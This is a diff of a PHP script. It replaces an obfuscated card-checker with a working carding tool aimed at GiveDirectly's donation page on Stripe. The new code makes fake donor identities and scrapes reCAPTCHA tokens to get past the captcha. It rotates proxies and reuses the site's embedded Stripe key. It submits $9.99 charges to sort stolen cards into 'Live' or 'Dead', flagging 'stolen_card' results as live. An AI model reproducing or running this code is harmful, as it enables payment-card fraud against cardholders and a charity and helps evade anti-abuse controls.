@@ -1,2 +1,486 @@
-<?php ${"G\x4cOBA\x4c\x53"}["\x6b\x62x\x73\x66mny\x6a\x6fw\x6f"]="\x63ct\x79\x70\x65";${"GL\x4f\x42\x41LS"}["\x78\x6ex\x76\x6dr\x69f\x70\x70\x74"]="\x72\x61n\x64";${"\x47\x4c\x4fB\x41\x4c\x53"}["t\x75bg\x70\x78s\x62\x66ewq"]="\x63\x63\x6blas";${"\x47\x4cOB\x41\x4c\x53"}["\x78d\x64hf\x66\x77\x71\x71o\x66"]="\x63\x63\x62ra\x6ed";${"G\x4c\x4fB\x41\x4c\x53"}["\x78\x67t\x69q\x75q\x66\x6a\x65"]="\x6eam\x61\x62nk";${"G\x4c\x4f\x42\x41L\x53"}["\x77\x78\x72\x6b\x77z\x6coe"]="\x67e\x74ba\x6e\x6b";${"G\x4c\x4f\x42\x41L\x53"}["\x6c\x66bq\x75\x74t\x6c"]="\x6aen\x69s\x63c";${"G\x4c\x4f\x42\x41\x4cS"}["rh\x76\x75unp\x76\x70"]="b\x69\x6e";${"G\x4c\x4f\x42\x41\x4c\x53"}["w\x6fz\x62\x75ndy"]="f\x6f\x72\x6d\x61\x74";${"\x47LO\x42\x41\x4c\x53"}["\x71\x6b\x61m\x78\x75\x72"]="\x65\x78py";${"\x47\x4c\x4f\x42A\x4c\x53"}["o\x6ch\x72c\x6e\x67bwr"]="e\x78\x70\x6d";${"\x47\x4cO\x42ALS"}["\x6b\x76\x73o\x78\x77\x77\x65\x77\x69\x6b"]="n\x75\x6d";${"\x47LO\x42A\x4c\x53"}["\x70\x6b\x64\x6a\x73\x72\x67\x6f\x65\x6f\x64"]="\x64a\x74\x61\x73";${"GLOBALS"}["r\x74a\x6b\x7a\x65\x67"]="\x64\x61\x74a";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x72\x74\x61\x6bz\x65g"]}=$_POST["\x64a\x74\x61"];if(!empty($_POST["\x64\x61t\x61"])){${"\x47L\x4f\x42\x41\x4c\x53"}["ti\x66\x76s\x6c\x68b\x73\x75"]="\x65\x78p\x79";${"\x47\x4cO\x42\x41\x4c\x53"}["je\x73x\x6e\x6cl\x6c\x67g\x79"]="d\x61t\x61";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["o\x71\x69\x69\x69\x6a"]="\x64\x61t\x61s";${"GL\x4fB\x41\x4c\x53"}["\x73e\x61r\x67yf"]="\x64\x61\x74\x61\x73";$cohssrfjye="\x65\x78\x70\x6d";preg_match("#^[\\\x64]{\x316}\x5c|[\x5c\x64]{\x32}\x5c|[\x5c\x64]{4}\x5c|[\x5c\x64]{\x33}\$#",${${"\x47\x4c\x4f\x42ALS"}["jes\x78\x6e\x6c\x6c\x6cg\x67y"]},${${"GL\x4fB\x41LS"}["\x73e\x61r\x67yf"]});${${"\x47\x4cO\x42\x41\x4cS"}["pk\x64\x6a\x73\x72\x67\x6f\x65\x6f\x64"]}=explode("|",${${"\x47L\x4f\x42A\x4c\x53"}["\x70k\x64\x6a\x73\x72g\x6f\x65o\x64"]}[0]);$miakmmpzglv="\x64a\x74\x61\x73";${"\x47L\x4f\x42\x41L\x53"}["\x6bd\x66\x70\x7awm\x6a"]="da\x74a\x73";${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6b\x76\x73\x6fxwwe\x77\x69\x6b"]}=${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x70\x6b\x64\x6a\x73rg\x6f\x65\x6f\x64"]}[0];${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x74\x78\x73\x6aiq\x6e\x6e\x66"]="\x65\x78\x70\x79";$yepgerkhboxc="\x63\x76v";${${"\x47L\x4f\x42\x41\x4cS"}["o\x6c\x68rc\x6e\x67\x62w\x72"]}=${${"\x47L\x4f\x42\x41\x4c\x53"}["kdfp\x7aw\x6d\x6a"]}[1];$kheclh="\x63\x76\x76";${${"\x47\x4cOB\x41L\x53"}["\x71k\x61m\x78ur"]}=${$miakmmpzglv}[2];${$kheclh}=${${"\x47\x4cOB\x41L\x53"}["o\x71\x69\x69\x69\x6a"]}[3];${${"\x47\x4c\x4f\x42AL\x53"}["w\x6f\x7a\x62\x75n\x64\x79"]}=${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6b\x76s\x6f\x78ww\x65w\x69k"]}."|".${$cohssrfjye}."|".${${"\x47\x4cO\x42\x41L\x53"}["\x74\x78sji\x71\x6e\x6e\x66"]}."|".${$yepgerkhboxc};if(${${"\x47\x4c\x4f\x42\x41LS"}["\x74\x69fvs\x6c\x68b\x73\x75"]}>=2017&&${${"GL\x4fB\x41\x4c\x53"}["\x6fl\x68r\x63n\x67b\x77r"]}<=12){${"\x47\x4cOB\x41L\x53"}["\x76\x6ay\x7aq\x75\x71\x66\x65f"]="g\x65\x74\x62\x61\x6e\x6b";$xknuxrz="\x62\x69\x6e";${${"\x47\x4cO\x42\x41L\x53"}["\x72hvu\x75\x6e\x70\x76p"]}=${${"\x47\x4c\x4f\x42AL\x53"}["k\x76s\x6f\x78w\x77\x65\x77\x69\x6b"]};${"\x47\x4c\x4f\x42AL\x53"}["f\x63nom\x6d\x63\x76"]="\x72\x61\x6e\x64";$aygehjeyype="\x62in";$qmnjgkftwxr="\x72a\x6e\x64";${$xknuxrz}=substr(${${"G\x4c\x4f\x42AL\x53"}["\x72h\x76\x75\x75\x6e\x70v\x70"]},0,6);${"\x47\x4c\x4f\x42\x41LS"}["\x7ahq\x71\x64m\x76\x62\x6fh\x6a"]="\x72\x61\x6e\x64";${"\x47\x4c\x4f\x42\x41L\x53"}["\x61k\x6b\x73\x6d\x6c\x73"]="\x6e\x61m\x61\x62n\x6b";$qovsrjkj="\x62\x69\x6e";$jeenvfvi="\x6ae\x6e\x69\x73c\x63";${${"\x47L\x4f\x42A\x4c\x53"}["v\x6a\x79\x7aq\x75qf\x65\x66"]}=explode(${$aygehjeyype},file_get_contents("ht\x74\x70://bi\x6es.pr\x6f/\x73e\x61\x72\x63\x68?act\x69\x6fn\x3d\x73\x65a\x72c\x68\x62i\x6e\x73\x26b\x69\x6es\x3d".${$qovsrjkj}."\x26ban\x6b\x3d\x26co\x75\x6e\x74ry\x3d"));${${"\x47\x4c\x4f\x42\x41LS"}["\x6cf\x62\x71u\x74t\x6c"]}=explode("</\x74d\x3e\x3ct\x64>",${${"GL\x4f\x42\x41\x4c\x53"}["\x77\x78rk\x77zl\x6f\x65"]}[2]);$ysiynzefgq="\x63c\x74\x79p\x65";${${"\x47\x4cOBA\x4c\x53"}["\x78g\x74\x69\x71\x75qf\x6a\x65"]}=explode("\x3c/\x74d>\x3c/\x74r\x3e",${$jeenvfvi}[5]);${"\x47\x4cO\x42AL\x53"}["u\x73k\x6d\x72js"]="ra\x6e\x64";$stmsvel="\x63\x63\x62\x61\x6e\x6b";${${"\x47LO\x42\x41L\x53"}["\x78\x64\x64h\x66fwqqo\x66"]}=${${"\x47\x4c\x4fBAL\x53"}["\x6c\x66b\x71ut\x74\x6c"]}[2];${$stmsvel}=${${"\x47\x4cO\x42A\x4c\x53"}["a\x6bk\x73m\x6c\x73"]}[0];${$ysiynzefgq}=${${"\x47L\x4fB\x41\x4c\x53"}["lf\x62qu\x74tl"]}[3];${${"G\x4cOB\x41LS"}["\x74\x75b\x67\x70\x78\x73b\x66\x65\x77q"]}=${${"\x47\x4cO\x42\x41\x4c\x53"}["\x6cf\x62q\x75t\x74\x6c"]}[4];${${"\x47\x4c\x4f\x42A\x4cS"}["\x78\x6e\x78v\x6drif\x70p\x74"]}=rand(1,5);if(${${"\x47L\x4fBA\x4cS"}["\x75\x73\x6b\x6d\x72j\x73"]}==1){$jntqyrt="\x63c\x62\x72\x61\x6ed";${"G\x4c\x4f\x42\x41\x4c\x53"}["a\x67\x6e\x6ak\x64\x61e\x6d"]="\x63c\x62\x61\x6e\x6b";echo"{\x22\x65\x72ro\x72\":\x31,\"m\x73\x67\":\x22<\x64iv>\x3c\x62\x20s\x74\x79\x6ce\x3d'\x63ol\x6f\x72:\x23\x300\x38\x30\x300\x3b'>\x4c\x69v\x65\x3c/b>\x20| ".${${"G\x4c\x4f\x42\x41LS"}["\x77\x6f\x7a\x62und\x79"]}." [B\x49N:\x20<\x62 \x73\x74yl\x65=\x27col\x6fr:bl\x75e;\x27>".${$jntqyrt}."\x3c/\x62\x3e\x3cb\x20\x73ty\x6c\x65='\x63\x6f\x6c\x6f\x72:\x72ed\x3b'> -\x20</\x62>\x3cb\x20\x73\x74yl\x65\x3d'color:b\x6cue\x3b'\x3e".${${"\x47LOB\x41\x4c\x53"}["\x61g\x6ejk\x64\x61\x65m"]}."\x3c/b\x3e\x3cb\x20s\x74\x79\x6ce\x3d'c\x6flo\x72:r\x65\x64;'>\x20-\x20\x3c/b\x3e\x3cb \x73tyle\x3d\x27\x63\x6f\x6cor:b\x6cu\x65;\x27\x3e".${${"G\x4c\x4f\x42A\x4c\x53"}["kb\x78s\x66\x6d\x6e\x79jo\x77\x6f"]}."\x3c/b><\x62 st\x79l\x65=\x27\x63o\x6c\x6fr:\x72\x65\x64\x3b'> - \x3c/b><\x62 st\x79l\x65=\x27c\x6fl\x6f\x72:blu\x65;'\x3e".${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74u\x62\x67p\x78\x73\x62\x66\x65w\x71"]}."\x3c/\x62>] $0.5 Checked - Shinji\x3c/d\x69\x76\x3e\x22}";}elseif(${$qmnjgkftwxr}==2){echo"{\"e\x72\x72or\":\x32,\x22\x6dsg\x22:\x22\x3c\x64iv><\x62\x20\x73ty\x6ce\x3d\x27\x63olor:#\x46F\x300\x30\x30;'>\x44\x69\x65</b\x3e |\x20".${${"\x47L\x4fB\x41\x4c\x53"}["\x77o\x7a\x62un\x64\x79"]}."\x20[GAT\x45:01]\x20\x40/Checked - Shinji\x3c/div\x3e\"}";}elseif(${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x66c\x6e\x6f\x6d\x6dc\x76"]}==3){${"G\x4c\x4f\x42AL\x53"}["anol\x64w\x65"]="f\x6fr\x6d\x61\x74";echo"{\x22error\":3,\"ms\x67\":\"\x3c\x64\x69\x76><b\x20styl\x65='\x63o\x6c\x6f\x72:\x238000\x380\x3b'>\x55n\x6bn\x6fwn\x3c/b\x3e | ".${${"\x47LO\x42\x41L\x53"}["a\x6e\x6f\x6cd\x77\x65"]}." |\x20[G\x41\x54\x45:01]\x20\x40/C\x68k\x4e\x45\x54-ID</\x64iv>\"}";}elseif(${${"G\x4c\x4fB\x41\x4c\x53"}["\x7a\x68q\x71\x64\x6dv\x62\x6f\x68j"]}==4){echo"{\x22e\x72\x72o\x72\":2,\"\x6d\x73g\":\x22<d\x69v\x3e\x3c\x62 s\x74\x79l\x65='\x63ol\x6fr:#F\x460000;\x27\x3e\x44\x69\x65\x3c/\x62>\x20|\x20".${${"\x47\x4cO\x42A\x4c\x53"}["\x77\x6fz\x62\x75n\x64\x79"]}."\x20[G\x41TE:\x301]\x20@/C\x68\x6b\x4eET-\x49D</\x64iv\x3e\x22}";}elseif(${${"G\x4c\x4f\x42\x41\x4cS"}["\x78n\x78\x76\x6d\x72i\x66\x70p\x74"]}==5){${"\x47\x4c\x4f\x42A\x4c\x53"}["li\x6eq\x62\x63\x67j\x61"]="fo\x72m\x61\x74";echo"{\x22e\x72ror\":3,\"\x6d\x73\x67\":\"<d\x69v>\x3c\x62 s\x74yl\x65\x3d\x27co\x6c\x6fr:\x23\x380\x300\x38\x30\x3b'\x3eUn\x6b\x6eow\x6e</b\x3e\x20|\x20".${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6c\x69\x6eq\x62c\x67\x6a\x61"]}."\x20|\x20[\x47A\x54E:0\x31]\x20\x40/\x43\x68\x6b\x4e\x45\x54-I\x44\x3c/d\x69\x76\x3e\x22}";}}else{$qrblsuynnj="\x66o\x72\x6d\x61\x74";echo"{\x22\x65\x72\x72\x6f\x72\":4,\"ms\x67\x22:\x22\x3c\x62>\x43\x68\x65ck\x20th\x65\x20\x76\x61lidi\x74\x79\x20o\x66 \x61 credi\x74\x20ca\x72\x64</b\x3e | ".${$qrblsuynnj}." [GAT\x45:\x301]\x20\x40/Checked - Shinji\x22}";}}
+<?php
+
+error_reporting(0);
+header("Content-Type: application/json");
+$proxies = load_proxies("proxies.txt");
+
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    if (
+        isset($_POST["ccn"]) &&
+        isset($_POST["month"]) &&
+        isset($_POST["year"]) &&
+        isset($_POST["cvc"])
+    ) {
+        $ccn = $_POST["ccn"];
+        $month = $_POST["month"];
+        $year = $_POST["year"];
+        $cvc = $_POST["cvc"];
+
+        if (empty($proxies)) {
+            http_response_code(500);
+            echo json_encode(["error" => "No proxies available"]);
+        } else {
+            process_card($ccn, $month, $year, $cvc, $proxies);
+        }
+    } else {
+        http_response_code(400);
+        echo json_encode([
+            "error" => "Missing one or more required data fields",
+        ]);
+    }
+} else {
+    http_response_code(405);
+    echo json_encode(["error" => "Only POST requests are allowed"]);
+}
+
+function get_random_user()
+{
+    try {
+        $response = file_get_contents("https://randomuser.me/api?nat=us");
+
+        if ($response === false) {
+            throw new Exception("Failed to fetch random data from API.");
+        }
+
+        $json_data = json_decode($response, true);
+        $user_info = isset($json_data["results"]) ? $json_data["results"] : [];
+
+        if (!empty($user_info)) {
+            $user_info = $user_info[0];
+            $first_name = $user_info["name"]["first"];
+            $last_name = $user_info["name"]["last"];
+            $email = $first_name . "." . $last_name . "@yahoo.com";
+
+            if ($first_name || $last_name || $email) {
+                return [$first_name, $last_name, $email];
+            }
+        }
+
+        return null;
+    } catch (Exception $e) {
+        http_response_code(500);
+        return json_encode(["error" => $e->getMessage()]);
+    }
+}
+
+function load_proxies($filename)
+{
+    $proxies = [];
+    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    foreach ($lines as $line) {
+        $proxyParts = explode(":", $line);
+        if (count($proxyParts) === 2) {
+            $ip = trim($proxyParts[0]);
+            $port = trim($proxyParts[1]);
+            $proxies[] = $ip . ":" . $port;
+        }
+    }
+
+    return $proxies;
+}
+
+function get_stripe_data()
+{
+    $api_url = "https://m.stripe.com/6";
+
+    try {
+        $opts = [
+            "http" => [
+                "method" => "POST",
+                "request_fulluri" => true,
+            ],
+        ];
+
+        $context = stream_context_create($opts);
+        $response = file_get_contents($api_url, false, $context);
+
+        if ($response === false) {
+            throw new Exception("Failed to fetch stripe data");
+        }
+
+        $json_data = json_decode($response, true);
+        $muid = isset($json_data["muid"]) ? $json_data["muid"] : null;
+        $guid = isset($json_data["guid"]) ? $json_data["guid"] : null;
+        $sid = isset($json_data["sid"]) ? $json_data["sid"] : null;
+
+        if ($muid && $guid && $sid) {
+            return [$muid, $guid, $sid];
+        }
+    } catch (Exception $e) {
+        http_response_code(500);
+        return json_encode(["error" => $e->getMessage()]);
+    }
+}
+
+function bypass_captcha()
+{
+    try {
+        $request = file_get_contents(
+            "https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf"
+        );
+        $pattern = '/type="hidden" id="recaptcha-token" value="(.*?)"/';
+        $token = "";
+        if (preg_match($pattern, $request, $matches)) {
+            if (isset($matches[1])) {
+                $token = $matches[1];
+            }
+        }
+        if ($token !== null) {
+            $headers = [
+                "accept: */*",
+                "accept-encoding: gzip, deflate, br",
+                "accept-language: fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
+                "content-type: application/x-www-form-urlencoded",
+                "origin: https://www.google.com",
+                "user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
+                "pragma: no-cache",
+                "sec-fetch-dest: empty",
+                "sec-fetch-mode: cors",
+                "sec-fetch-site: same-origin",
+                "referer: https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf",
+            ];
+            $data = [
+                "v" => "pCoGBhjs9s8EhFOHJFe8cqis",
+                "k" => "6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa",
+                "reason" => "q",
+                "c" => $token,
+                "co" => "aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.",
+                "hl" => "en",
+                "size" => "invisible",
+                "chr" => "%5B79%2C17%2C39%5D",
+                "vh" => "19287791902",
+                "bg" =>
+                    "3tig2N0KAAQVCIdpbQEHnAbQ-_ld0wKQtuUGdgz48tMdDG6Y37QSVQk6saWxLfzmLQ5n-wnTHIukPYy-zt1XevEoVPWoFpnmZ-i6-qXpwbOeWrOSuEY12k7KPqJIuX43u3MNY6yz34uOcOcUKo2TbasUbkdS-PbYSN3A64RjZORV6JhpMdgZE0NOh8m5ssYkkefHJVLzzzyC2qZrMw5E3bWfbwqQAwY5vyzhqPHDO649RbxxsuLnfFTmXhL2xRZREFtasghBUoP9XF5aUw8IlGtYcDsxqPFcpw8-Jl_34aZeS40Ot830hrxvjGjVFnraz0iKuvN4V65CA_CLyzprxBVXttv-KhKVsspHMhEJ5npvyhmsEkLJA_DYP1eyU1tDcPMcjhbN_WFLgkvfiXC995iE-pi2GdaWHgY7-3VP19CR_gNCyUZ2FAn9UFf4z6vkDe9hkiC3kXLWsjrVEiwV79DDDaHSIQ9dKaNOVzckZhX4A-YeYPfBiZSQ22y7Lwmsyw3xkt1rqF5gL_eFUNXQfbi4u18ZvkFkixLnUvnpG-ZG1WuzEFb34NchNmb-3pWIrjpnV4ANlhsYTkSZiGwzdXiaVKoklBuBL01666y0H7Ie7A9oMHYyWmn1oMrt0_pEWRwr8BPQVNEULIqe0QGa6u6JMrPZ8IIKpBa4LSPRxempn2kSX1QaFqqsNrQUr6a4RiM4-RxPg4ZJwdfuIxDYNY5ywFIRrUHFxz_VN7bmH9ipbdAINBL7J9l1xvh369GFYUpMw1uL8hhanqHqNPq58s73U8DOtLclMtHiQcgfizvVCkljGY3Db1OSxjQ5ySy_amva91ms4LwBWTJlcWKDOlDXiKWtGYYJrxj78Z5KNRodG05EJHgBBmYQU2nxA6RAVWC2Z7hzIIZ01NYvDrcDfrtag7a2qpy4RVQI5QlB6hhJrzek4uZSxcwV-xWKcvvmKjOyExcTJ-zNrJ5h-oVUgonI7PFd4GPD04yHJM6ifivohRVJOVtBHbYh1l2sdG4wnNdQrqgJta9aR8PMVmzB93ZxN5sJGZmNQJ1OLsOonYHd80YR3Bu8OzeweoMOmhIrk-j5_bMI483_l-roGZR8uDoekYl_1sJwwyQnhhgyBLqGw-xERL1oQrLw7Ls_Q3cgCAuZwVKr32fa1SlJYjWGPnX7TE72X82P9bCCHr2yNTJSzGFlPYUsk5tnEDxqw_fW27ZOu4zLdiyuAY1fpMHyx6-W9_9TY9jKtYn6pC5VnIZeZO_SG-NjDj2SsdgITHHOWfrM43cnECYuUVdKD_6H3OUoNTXfnkjzQ54kNxTmtbW1Iq4FNWFYPyi6MCpZU1mGusylxvrCJQdsG7oy3bSSRq47LTPwC3NFjE7twA9r-NOdQj7XOqNyAWLz_ebp7Dsp_r6Bkk9cPn0fBkNJw9tUFPOhchSPFFUO8yzteBviuwhVKQVC2RsTfPYF4SZg0snpmoVWqr2xYyakB9KLNZO_Rjroyr5o9_K2oYcAkqKVoWTQF3VvQn9X3QcR82F6qVomyLly4b3HJcX32cojip8ubD-xycaYKjWjFrynyCDRGl7rJTlmpIBoi098iGFUNwVBrbgbpjaaOsx-LA490Nl-OFf8JF0cWWcBd_MWlJeVsyGamzXMQMO8rJ9EbYwWhDwAJ3VEupsVgPG-EOefqN9AUP9m-IAhvVi4JWchxhr4i2fN-mils-F5zPzMQT9igGj3VOYcAjp500IdikQViZ1Xfg6aVH1nIuXbeZdTLgFQq3y3RJR1Fb23KoXMJkqBnAowzy5bctoNGpSLcCrDXxuX5g9G3OKYpr54rtvYdxyi80rOSUdRyJA_dszrbw2t-h2KVtvhAxu3Zp7A73eo0EPMVvL2uynAEaX0l4NrqeIgwwMKadjxRcvJ-u6eTqNUUTAGyGtuzaK04sJpuJ3ZzZ_NCzcVpYDarNHngydlsYJzfJreVWfat-Ebjg-ofUAJhi4xq2h18PArHDcSjrqzZUtGyGaKLAVaK2pAGJRz6zgSVSHdFpssKzvltHfriqN61WKVruAVFjfC4kWM4hlaC_IE7AjztE7Vf3R8xtKts2jYbN6YLQsiLsW1t7_q-ewQJjNbyDKF1AC-c7v3t2r9-dHzvi_hroHsZO9_MlAYJNfxOMq3oKVXJnMl8O415yU7OwhNenIXyRYfoktTL5LKYY6uk1HX2Dt6wuOGvhoWnrpUpJtSIz7l532yiQqOtLgYS3EtE2h2Yh0IK3qGk4zxfpxqROyYhcRKCzMwuFYkFJ7gtl5jVsk8IwnrJ7RpiaAqyOWxvsURMfv3KjzWGd2kLhKR7TYL8qLCwlv5PNgyqd9LTYDK4g",
+            ];
+
+            $url =
+                "https://www.google.com/recaptcha/api2/reload?k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa";
+            $opts = [
+                "http" => [
+                    "method" => "POST",
+                    "header" => $headers,
+                    "content" => http_build_query($data),
+                ],
+            ];
+
+            $context = stream_context_create($opts);
+            $response = file_get_contents($url, false, $context);
+
+            if ($response !== false) {
+                $pattern = '/\["rresp","(.*?)"/';
+                if (preg_match($pattern, $response, $matches)) {
+                    if (isset($matches[1])) {
+                        return $matches[1];
+                    }
+                }
+            }
+        }
+
+        throw new Exception("Failed to get captcha token");
+    } catch (Exception $e) {
+        http_response_code(500);
+        return json_encode(["error" => $e->getMessage()]);
+    }
+}
+
+function get_card_info($ccn)
+{
+    try {
+        $url = "https://lookup.binlist.net/" . $ccn;
+        $headers = [
+            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+        ];
+
+        $opts = [
+            "http" => [
+                "method" => "GET",
+                "header" => $headers,
+            ],
+        ];
+
+        $context = stream_context_create($opts);
+        $response = file_get_contents($url, false, $context);
+
+        if ($response !== false) {
+            $data = json_decode($response, true);
+
+            if (
+                isset($data["bank"]["name"]) &&
+                isset($data["country"]["alpha2"]) &&
+                isset($data["type"]) &&
+                isset($data["scheme"])
+            ) {
+                $bank = $data["bank"]["name"];
+                $country = $data["country"]["alpha2"];
+                $card_type = ucfirst($data["type"]);
+                $brand = ucfirst($data["scheme"]);
+
+                $cardInfo = [
+                    "bank" => $bank,
+                    "country" => $country,
+                    "type" => $card_type,
+                    "brand" => $brand,
+                ];
+
+                $cardInfoObject = json_decode(json_encode($cardInfo));
+                return $cardInfoObject;
+            }
+        }
+
+        throw new Exception("Failed to get card information");
+    } catch (Exception $e) {
+        http_response_code(500);
+        return json_encode(["error" => $e->getMessage()]);
+    }
+}
+
+function process_card($ccn, $month, $year, $cvc, $proxies)
+{
+    try {
+        list($first_name, $last_name, $email) = get_random_user();
+        list($muid, $guid, $sid) = get_stripe_data();
+
+        if (
+            $first_name !== null ||
+            $last_name !== null ||
+            $email !== null ||
+            $muid !== null ||
+            $guid !== null ||
+            $sid !== null
+        ) {
+            $headers = [
+                "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
+                "content-type: application/json",
+            ];
+
+            $payload = [
+                "cents" => 999,
+                "frequency" => "once",
+                "directDonationTo" => "unrestricted",
+                "emailAddress" => $email,
+                "firstName" => $first_name,
+                "lastName" => $last_name,
+                "recaptchaResponse" => bypass_captcha(),
+                "subscribeToEmailList" => true,
+            ];
+
+            $context = stream_context_create([
+                "http" => [
+                    "method" => "POST",
+                    "header" => $headers,
+                    "content" => json_encode($payload),
+                    "proxy" => "tcp://" . $proxies[array_rand($proxies)],
+                    "timeout" => 10,
+                ],
+            ]);
+
+            $payment_req = file_get_contents(
+                "https://www-backend.givedirectly.org/payment-intent",
+                false,
+                $context
+            );
+
+            if ($payment_req == false) {
+                throw new Exception("Failed to retrieve payment intent or rate limited");
+            }
+
+            $payment_data = json_decode($payment_req, true);
+            if ($payment_data && json_last_error() !== JSON_ERROR_NONE) {
+                throw new Exception(json_last_error_msg());
+            }
+
+            $client_secret = $payment_data["clientSecret"];
+            $payment_intent = $payment_data["paymentIntent"];
+
+            $payment_data = [
+                "payment_method_data[type]" => "card",
+                "payment_method_data[billing_details][name]" =>
+                    $first_name . " " . $last_name,
+                "payment_method_data[card][number]" => $ccn,
+                "payment_method_data[card][cvc]" => $cvc,
+                "payment_method_data[card][exp_month]" => $month,
+                "payment_method_data[card][exp_year]" => $year,
+                "payment_method_data[guid]" => $guid,
+                "payment_method_data[muid]" => $muid,
+                "payment_method_data[sid]" => $sid,
+                "payment_method_data[pasted_fields]" => "number",
+                "payment_method_data[payment_user_agent]" =>
+                    "stripe.js/09e54426b4; stripe-js-v3/09e54426b4;card-element",
+                "payment_method_data[time_on_page]" => "40265",
+                "expected_payment_method_type" => "card",
+                "use_stripe_sdk" => "true",
+                "client_secret" => $client_secret,
+            ];
+
+            $stripeSecretKey = "pk_live_B3imPhpDAew8RzuhaKclN4Kd";
+            $context = stream_context_create([
+                "http" => [
+                    "method" => "POST",
+                    "header" => [
+                        "Content-Type: application/x-www-form-urlencoded",
+                        "Authorization: Basic " .
+                        base64_encode($stripeSecretKey . ":"),
+                    ],
+                    "content" => http_build_query($payment_data),
+                    "proxy" => "tcp://" . $proxies[array_rand($proxies)],
+                    "timeout" => 10,
+                ],
+            ]);
+
+            $response = file_get_contents(
+                "https://api.stripe.com/v1/payment_intents/" .
+                    $payment_intent .
+                    "/confirm",
+                false,
+                $context
+            );
+
+            if ($response === false) {
+                throw new Exception("Stripe payment gateway failed or rate limited");
+            }
+
+            $conditions = [
+                "cvc_check: pass" => [
+                    "status" => "Live",
+                    "message" => "CVV Matched",
+                ],
+                "succeeded" => [
+                    "status" => "Live",
+                    "message" => "CVV Matched",
+                ],
+                "requires_payment_method" => [
+                    "status" => "Live",
+                    "message" => "CVV Matched",
+                ],
+                "authentication" => [
+                    "status" => "Live",
+                    "message" => "CVV Matched",
+                ],
+                "Thank You For Donation." => [
+                    "status" => "Live",
+                    "message" => "CVV Matched",
+                ],
+                'type: "one-time"' => [
+                    "status" => "Live",
+                    "message" => "CVV Matched",
+                ],
+                "security code is incorrect." => [
+                    "status" => "Live",
+                    "message" => "CCN Matched",
+                ],
+                "Your card's security code is incorrect." => [
+                    "status" => "Live",
+                    "message" => "CCN Matched",
+                ],
+                "incorrect_cvc" => [
+                    "status" => "Live",
+                    "message" => "CCN Matched",
+                ],
+                "stolen_card" => [
+                    "status" => "Live",
+                    "message" => "Stolen Card",
+                ],
+                "lost_card" => [
+                    "status" => "Live",
+                    "message" => "Lost Card",
+                ],
+                "Your card has insufficient funds." => [
+                    "status" => "Live",
+                    "message" => "Insufficient Funds",
+                ],
+                "pickup_card" => [
+                    "status" => "Dead",
+                    "message" => "Pickup Card",
+                ],
+                "insufficient_funds" => [
+                    "status" => "Dead",
+                    "message" => "Insufficient Funds",
+                ],
+                "Your card has expired." => [
+                    "status" => "Dead",
+                    "message" => "Card Expired",
+                ],
+                "Your card number is incorrect." => [
+                    "status" => "Dead",
+                    "message" => "Incorrect credit card number",
+                ],
+                "Your card was declined." => [
+                    "status" => "Dead",
+                    "message" => "Card declined",
+                ],
+                "reenter" => ["status" => "Dead", "message" => "Re-enter"],
+                "do_not_honor" => [
+                    "status" => "Dead",
+                    "message" => "Do not honor",
+                ],
+                "transaction_not_allowed" => [
+                    "status" => "Dead",
+                    "message" => "Transaction not allowed",
+                ],
+                "generic_decline" => [
+                    "status" => "Dead",
+                    "message" => "Generic decline",
+                ],
+                "Your card's security code is invalid." => [
+                    "status" => "Dead",
+                    "message" => "Invalid security code",
+                ],
+                "invalid_cvc" => [
+                    "status" => "Dead",
+                    "message" => "Invalid CVC",
+                ],
+                "card_not_supported" => [
+                    "status" => "Dead",
+                    "message" => "Card not supported",
+                ],
+                "expired_card" => [
+                    "status" => "Dead",
+                    "message" => "Expired card",
+                ],
+                "card_declined" => [
+                    "status" => "Dead",
+                    "message" => "Card declined",
+                ],
+                "call_issuer" => [
+                    "status" => "Dead",
+                    "message" => "Call issuer",
+                ],
+                "Your card's security code is not correct." => [
+                    "status" => "Dead",
+                    "message" => "Incorrect security code",
+                ],
+                "currency_not_supported" => [
+                    "status" => "Dead",
+                    "message" => "Currency not supported",
+                ],
+                "Try Again Later" => [
+                    "status" => "Dead",
+                    "message" => "Try again later",
+                ],
+            ];
+
+            $result = null;
+            foreach ($conditions as $condition => $msg) {
+                if (strpos($response, $condition) !== false) {
+                    if ($msg["status"] == "Live") {
+                        $result = [$msg, get_card_info($ccn)];
+                    } else {
+                        $result = $msg;
+                    }
+                    break;
+                }
+            }
+            if ($result !== null) {
+                echo json_encode($result);
+            } else {
+                echo json_encode(["status" => "Unknown"]);
+            }
+        }
+    } catch (Exception $e) {
+        http_response_code(500);
+        echo json_encode(["error" => $e->getMessage()]);
+    }
+}
+
 ?>
